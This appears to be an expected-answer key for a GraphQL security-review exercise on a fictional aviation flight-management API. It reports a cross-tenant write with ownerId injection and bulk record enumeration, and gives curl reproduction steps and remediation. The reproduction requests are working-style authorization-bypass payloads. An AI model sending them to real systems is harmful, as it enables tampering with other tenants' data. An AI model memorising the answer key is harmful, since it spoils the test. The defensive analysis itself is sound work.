# Expected Response

## System
- Domain: Aviation / Flight Ops
- System: AeroOps Flight Management
- Example ID: GQL-0037

## Priority Findings

### Finding 1: Cross-Tenant Write BOLA + Authorization-Bypass via ownerId Injection on updateResource (Pattern 5.1)
**Severity:** Critical
**Category:** Injection / BOLA

**Summary:**
The `updateResource` mutation on `POST /graphql` accepts an arbitrary `id` and `input` without verifying that the target resource belongs to the authenticated user's tenant. An attacker from `tenant-fa1a` targeted flight record `R-2037` (belonging to `tenant-33b6`) and injected `status: "approved"` and `ownerId: "attacker-fa1a33b6"` through the mutation input, successfully cross-tenant-writing and hijacking ownership of a flight operations record. The response `200 OK` with `tenant-33b6` data confirms the authorization was bypassed. In aviation, fraudulent `status: "approved"` updates to flight management records carry direct safety implications.

**Evidence from HAR:**
- Request: `POST https://api.aeroops-flight-manag.example.com/graphql` (2026-04-13T16:22:34Z, 161 ms)
- JWT `x-tenant-id`: `tenant-fa1a` — attacker's identity
- Mutation payload: `updateResource(id: "R-2037", input: {status: "approved", ownerId: "attacker-fa1a33b6"})` — cross-tenant write with injected ownerId
- Response HTTP status: `200 OK` — mutation succeeded, no authorization error
- Response `tenantId`: `tenant-33b6` — victim's flight record was modified
- Response `ownerId`: `other-user-fa1a33b6`
- Response `sensitiveField`: `CONFIDENTIAL-fa1a33b6`
- Response `internalNotes`: `Internal data exposed`
- `x-request-id`: `req-fa1a33b6`

**Root Cause (§4.0 RISK-GQL-037 + §5.0):** The `updateResource` resolver fetches and writes by `resourceId` only, without asserting `WHERE tenant_id = $jwt.tenantId`. Additionally, the `input` object accepts `ownerId` as a writable field (mass assignment), enabling an attacker to inject ownership claims. The JWT is validated but its `tenantId` claim is never enforced as a boundary.

**Evidence Map:**
| Artifact | Location | Detail |
|---|---|---|
| context.txt §4.0 | RISK-GQL-037 | "resolver does NOT verify tenantId against JWT's tenantId" |
| context.txt §5.0 | Pattern 5.1 | Authorization-bypass injection via `resourceId` and input field injection |
| HAR entry | request.postData | `updateResource(id: "R-2037", input: {status: "approved", ownerId: "attacker-fa1a33b6"})` |
| HAR entry | response.content | `tenantId: "tenant-33b6"`, mutation `200 OK` — cross-tenant write confirmed |

---

### Finding 2: Cross-Tenant Bulk Enumeration via bulkResourceLookup (Pattern 1.9)
**Severity:** High
**Category:** BOLA / Mass Enumeration

**Root Cause (§4.0):** "The `bulkResourceLookup` mutation accepts an arbitrary array of IDs without per-ID ownership filtering."

---

## Steps to Reproduce

### Step 1 — Confirm attacker baseline (own tenant write)
```bash
curl -s -X POST https://api.aeroops-flight-manag.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-fa1a" \
  -d '{"query": "mutation { updateResource(id: \"R-fa1a-001\", input: {status: \"pending\"}) { resourceId status tenantId } }"}'
```
**Expected:** Update succeeds only for own-tenant record; `tenantId: "tenant-fa1a"`.

### Step 2 — Cross-tenant write + ownerId injection (HAR attack)
```bash
curl -s -X POST https://api.aeroops-flight-manag.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-fa1a" \
  -d '{"query": "mutation { updateResource(id: \"R-2037\", input: {status: \"approved\", ownerId: \"attacker-fa1a33b6\"}) { resourceId status tenantId } }"}'
```
**Vulnerable outcome:** `200 OK`, flight record `R-2037` (belonging to `tenant-33b6`) updated to `status: "approved"`, `ownerId` hijacked to `attacker-fa1a33b6` — **cross-tenant write + ownership takeover confirmed**.
**Secure outcome:** HTTP 403 or `{"errors": [{"message": "Forbidden"}], "data": {"updateResource": null}}`.

### Step 3 — Bulk cross-tenant enumeration
```bash
curl -s -X POST https://api.aeroops-flight-manag.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-fa1a" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2037\", \"R-33b6-002\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns flight records from `tenant-33b6`.
**Secure outcome:** Only own-tenant records returned; cross-tenant IDs yield null or FORBIDDEN.

## Secure Outcome Verification
For **Step 2**, a correctly patched implementation MUST return:
```json
{
  "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }],
  "data": { "updateResource": null }
}
```

## Remediation
1. **Resolver-level tenant guard on updateResource:** Before applying the update, verify `WHERE resource_id = $id AND tenant_id = $jwt.tenantId`. Reject with FORBIDDEN if the record belongs to a different tenant.
2. **Strip ownerId from writable input:** `ownerId` MUST NOT be accepted as a client-supplied input field. Ownership is derived from the JWT's `sub` claim only.
3. **Strip tenantId from writable input:** If `ResourceInput` accepts `tenantId`, strip it server-side — tenant must never be set by the client.
4. **Per-ID ownership filter in bulkResourceLookup:** Post-fetch, reject any result whose `tenant_id` ≠ JWT's `tenantId`.
5. **Redis cache key includes tenantId:** §2.0 caches by `resourceId` only — change to `resourceId:tenantId`.
6. **Automated regression tests:** Assert `tenant-fa1a` calling `updateResource(id: "R-2037", ...)` on a `tenant-33b6` record receives FORBIDDEN.
